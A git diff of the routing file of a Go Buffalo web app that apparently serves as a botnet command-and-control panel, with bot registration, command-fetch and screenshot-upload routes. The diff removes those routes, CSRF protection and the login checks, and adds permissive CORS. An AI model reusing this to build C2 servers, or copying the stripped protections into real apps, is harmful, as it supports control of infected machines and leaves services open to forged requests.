@@ -9,7 +9,9 @@ import (
 
 	"github.com/MShoaei/command_control/models"
 	"github.com/gobuffalo/buffalo-pop/pop/popmw"
-	csrf "github.com/gobuffalo/mw-csrf"
+	contenttype "github.com/gobuffalo/mw-contenttype"
+	"github.com/gobuffalo/x/sessions"
+	"github.com/rs/cors"
 )
 
 // ENV is used to help switch settings based on where the
@@ -33,7 +35,11 @@ var app *buffalo.App
 func App() *buffalo.App {
 	if app == nil {
 		app = buffalo.New(buffalo.Options{
-			Env:         ENV,
+			Env:          ENV,
+			SessionStore: sessions.Null{},
+			PreWares: []buffalo.PreWare{
+				cors.Default().Handler,
+			},
 			SessionName: "_command_control_session",
 		})
 
@@ -43,39 +49,15 @@ func App() *buffalo.App {
 		// Log request parameters (filters apply).
 		app.Use(paramlogger.ParameterLogger)
 
-		// Protect against CSRF attacks. https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
-		// Remove to disable this.
-		app.Use(csrf.New)
+		// Set the request content type to JSON
+		app.Use(contenttype.Set("application/json"))
 
 		// Wraps each request in a transaction.
 		//  c.Value("tx").(*pop.Connection)
 		// Remove to disable this.
 		app.Use(popmw.Transaction(models.DB))
 
-		app.Use(SetCurrentUser)
-		app.Use(Authorize)
-
-		app.Middleware.Skip(Authorize, HomeHandler, UsersNew, AuthNew, AuthCreate, RegisterHandler, ScreenShotHandler, CommandHandler)
-
-		app.Middleware.Skip(csrf.New, RegisterHandler, ScreenShotHandler, CommandHandler)
-
 		app.GET("/", HomeHandler)
-		app.GET("/users/new", UsersNew)
-		app.POST("/users", UsersCreate)
-		app.GET("/signin", AuthNew)
-		app.POST("/signin", AuthCreate)
-		app.DELETE("/signout", AuthDestroy)
-
-		app.Redirect(302, "/panel", "/panel/bots")
-
-		app.Resource("/panel/bots", BotsResource{})
-
-		app.POST("/register", RegisterHandler)
-		app.GET("/command/{bot_id}", CommandHandler)
-		app.POST("/ss/{bot_id}", ScreenShotHandler)
-		app.POST("/command/new", NewCommandHandler)
-
-		app.ServeFiles("/", assetsBox) // serve files from the public
 	}
 
 	return app
